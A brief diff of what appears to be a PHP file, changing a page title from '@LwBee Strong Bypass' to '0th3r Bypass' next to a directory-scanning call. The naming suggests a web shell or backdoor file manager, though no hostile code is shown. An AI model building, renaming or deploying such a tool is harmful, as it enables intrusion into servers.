@@ -96,7 +96,7 @@ $scannedItems = scanDirectory($rootPath);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>@LwBee Strong Bypass</title>
+    <title>0th3r Bypass</title>
     <style>
         * {
             box-sizing: border-box;
